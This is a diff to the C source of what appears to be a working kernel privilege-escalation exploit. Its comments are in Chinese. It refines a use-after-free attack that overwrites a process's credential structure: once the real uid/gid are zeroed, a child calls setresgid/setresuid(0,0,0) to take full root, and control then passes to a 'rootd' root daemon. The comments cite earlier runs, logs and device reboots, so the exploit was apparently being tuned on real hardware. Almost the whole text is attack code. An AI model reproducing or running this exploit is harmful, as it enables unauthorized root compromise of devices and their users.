@@ -1867,6 +1867,22 @@ static void cred_child(void)
 				"[child-cred] degraded handoff authorized by parent\n");
 			go = 1;
 		}
+		if (go == 0xCC) {
+			/* 2.0.45：内核许可的自助提权。写零已把 ruid/rgid 清零后，
+			 * 非特权 setresgid/setresuid 允许把其余身份字段设为当前
+			 * {r,e,s} 集合内的值——0 在集合内。commit_creds 走标准
+			 * 内核路径产生全新的全零 cred_jar 对象（suid/fsuid 天然
+			 * 归零），比瓦片拼凑的半清 cred 干净得多，且 rootd 的
+			 * fork 门禁与八字段自查天然通过。注意：此后 task 指向新
+			 * cred，旧对象（g_cred_kva）已被调换，父进程不得再对它
+			 * 开瓦片。 */
+			setresgid(0, 0, 0);
+			setresuid(0, 0, 0);
+			dprintf(STDOUT_FILENO,
+				"[child-cred] self-escalate via setresid: uid=%d euid=%d gid=%d egid=%d\n",
+				getuid(), geteuid(), getgid(), getegid());
+			go = 1;
+		}
 		uid = getuid();
 		euid = geteuid();
 		gid = getgid();
@@ -2377,6 +2393,12 @@ int uaf_plant_main(int argc, char **argv)
 	 * 其消亡即对象引用归零、页被内核释放——此后对 g_cred_kva 开瓦片就是
 	 * 写 freed slab（堆破坏）。循环内每轮探活，真死立即停火。 */
 	int child_gone = 0;
+	/* 2.0.45：自助提权状态。瓦片只负责 cred+4（uid/gid）——历史数据里
+	 * 它从未粘滞（2~5 个周期必落）；euid/suid/fsuid 的"粘滞"是每次
+	 * boot 的确定性行为（44.log：euid 24 周期全命中页面却零落地），
+	 * 加周期无意义。ruid=0 后 child 经 setresuid(0,0,0) 内核许可路径
+	 * 自行归零其余字段。仅在自助路径失败时才回退到瓦片。 */
+	int self_escalated = 0;
 	for (int attempt = 1; attempt <= 24 && !rooted; attempt++) {
 		unsigned uid = 1, euid = 1, cgid = 1, cegid = 1;
 		unsigned uids[4], gids[4];
@@ -2406,6 +2428,11 @@ int uaf_plant_main(int argc, char **argv)
 		}
 		int all_ok = 1;
 		for (int k = 0; k < 4; k++) {
+			/* 2.0.45：只有 uid/gid 需要瓦片；其余字段由 child 的
+			 * setresuid 自助提权解决。0xCC 之后 cred 对象被调换，
+			 * 任何情况下都不再对其他字段开瓦片。 */
+			if (k > 0)
+				continue;
 			if (field_done[k]) {
 				dprintf(STDOUT_FILENO, "[cred] %s already zero, skip\n",
 					cred_field_name[k]);
@@ -2434,35 +2461,29 @@ int uaf_plant_main(int argc, char **argv)
 		dprintf(STDOUT_FILENO, "[cred] fields cleared, verifying\n");
 		if (ask_child(&uid, &euid, &cgid, &cegid) == 0) {
 			if (uid == 0 && euid == 0 && cgid == 0 && cegid == 0) {
-				if (all8) {
-					rooted = 1;
-					continue;
-				}
-				/* 2.0.42：仅剩 suid/sgid/fsuid 等滞留字段时的降级决策。
-				 * 第 19 次实测：suid/sgid 连续 22 个尝试未落，清零循环
-				 * 被拖到 23+ 次尝试、60+ 个 UAF 周期，设备最终在周期中
-				 * 重启——周期次数即内核风险敞口。连续 6 个尝试无进展即
-				 * 带缺交接：rootd 的文件操作按滞留字段受限（39.log 实证
-				 * fsuid=2000 时 root 通道仍可用），换取周期数回落到成功
-				 * 轮的水平。 */
-				if (++half_cleared_streak >= 6) {
-					/* 2.0.43：授权 child 在半清 cred 上 fork rootd。
-					 * 没有这一步，child 的严格门禁会让通道永远建不起来
-					 * （第 20 次实测）。给 child 500ms 完成 fork。 */
-					unsigned char auth = 0xBB;
-					struct timespec wait = { .tv_sec = 0, .tv_nsec = 500000000L };
-					dprintf(STDOUT_FILENO,
-						"[cred] proceeding with partially cleared cred after %d idle attempts\n",
-						half_cleared_streak);
-					log_proc_uid(g_cred_child_pid);
-					if (write(g_wake[1], &auth, 1) == 1)
-						nanosleep(&wait, NULL);
-					rooted = 1;
-					continue;
-				}
+				rooted = 1;
+				continue;
+			}
+			/* 2.0.45：uid/gid 已清而 euid 未落 → 停止瓦片，委托 child
+			 * 走 setresuid 自助提权（ruid=0 后 euid=0 在非特权允许
+			 * 集合内）。这是主路径，不是降级——瓦片对粘滞字段无效。 */
+			if (uid == 0 && cgid == 0 && !self_escalated) {
+				unsigned char esc = 0xCC;
+				struct timespec wait = { .tv_sec = 0, .tv_nsec = 500000000L };
 				dprintf(STDOUT_FILENO,
-					"[cred] uid/euid clear, remaining id fields pending (%d)\n",
-					half_cleared_streak);
+					"[cred] uid/gid clear - delegating remaining ids to setresid self-escalation\n");
+				if (write(g_wake[1], &esc, 1) == 1)
+					nanosleep(&wait, NULL);
+				self_escalated = 1;
+				continue;
+			}
+			if (self_escalated && euid != 0) {
+				/* 理论上不可达：ruid=0 时 setresuid(0,0,0) 必成功。
+				 * 注意绝不能回退瓦片——0xCC 里 setresgid 的成功已触发
+				 * commit_creds，cred 对象被调换，旧 g_cred_kva 悬空，
+				 * 再开瓦片就是写 freed slab。安全选项只剩重试/重启。 */
+				dprintf(STDOUT_FILENO,
+					"[cred] self-escalation did not take effect (unexpected); no tiles after swap\n");
 				continue;
 			}
 			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
